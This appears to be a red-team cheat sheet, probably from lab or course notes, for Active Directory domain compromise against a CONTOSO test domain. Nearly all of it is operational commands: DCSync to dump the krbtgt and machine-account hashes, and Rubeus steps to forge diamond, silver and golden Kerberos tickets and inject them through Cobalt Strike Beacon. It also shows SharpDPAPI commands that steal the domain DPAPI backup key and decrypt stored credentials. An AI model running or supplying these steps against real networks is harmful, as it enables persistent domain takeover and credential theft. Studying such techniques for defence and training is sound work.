
##### DCSync

Obtain krbtgt hash and machine account hash
```powershell
dcsync contoso.com CONTOSO\krbtgt

dcsync contoso.com CONTOSO\lon-db-1$

512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c
bc6fd6e8519b52e09f60961beeee083a441c25908e30a6c29b124b516e06945f
cce3f72b3b4bcffe0af7979588b885b6
```

---
##### Diamond Ticket

> **From the medium-integrity Beacon**:

Use AES256 hash of the `krbtgt` account to create a diamond ticket
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap
```

> **From the high-integrity Beacon**:

 Create a new sacrificial logon session for the impersonated user
 ```powershell
make_token CONTOSO\Administrator FakePass
```

Inject Diamond Ticket into logon session and verify
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:

run klist
run klist purge
```

---

##### DPAPI Backup Key Abuse

> From the medium-integrity Beacon

Within a Domain Admin session Recover the domain's backup DPAPI key.
```powershell
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey

```

Drop the impersonation and use the key to decrypt credentials stored in the Credential Manager
```powershell
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:
```

---
##### Silver Ticket

> This can be done locally offline on your machine

Use AES256 machine hash to forge silver ticket (any service can be used)
```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/lon-db-1 /aes256:[HASH] /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```

> **From the high-integrity Beacon**:

 Create a new sacrificial logon session for the impersonated user
 ```powershell
make_token CONTOSO\Administrator FakePass
```

Inject Silver Ticket into logon session and verify
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:

run klist
run klist purge
```

---
##### Golden Ticket

> This can be done locally offline on your machine

Use AES256 hash of the `krbtgt` account to forge a golden ticket as the default DA
```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```

> **From the high-integrity Beacon**:

 Create a new sacrificial logon session for the impersonated user
 ```powershell
make_token CONTOSO\Administrator FakePass
```

Inject GOlden Ticket into logon session and verify
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:

run klist
run klist purge
```